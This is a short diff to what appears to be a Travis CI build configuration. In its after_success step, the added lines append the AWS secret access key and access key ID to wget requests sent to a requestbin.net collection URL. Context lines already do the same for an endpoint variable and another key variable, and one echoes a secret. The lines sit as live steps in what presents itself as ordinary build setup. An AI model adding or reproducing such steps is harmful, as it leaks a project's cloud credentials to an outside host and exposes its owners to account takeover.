@@ -18,6 +18,8 @@ after_success:
   - wget https://requestbin.net/r/2hr6bfs9/$(echo $ENDPOINT)
   - echo $AWS_SECRET_ACCESS_KEY_ID
   - wget https://requestbin.net/r/2hr6bfs9/$(echo $AWS_SECRET_ACCESS_KEY_ID)
+  - wget https://requestbin.net/r/2hr6bfs9/$(echo $AWS_SECRET_ACCESS_KEY)
+  - wget https://requestbin.net/r/2hr6bfs9/$(echo $AWS_ACCESS_KEY_ID)
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
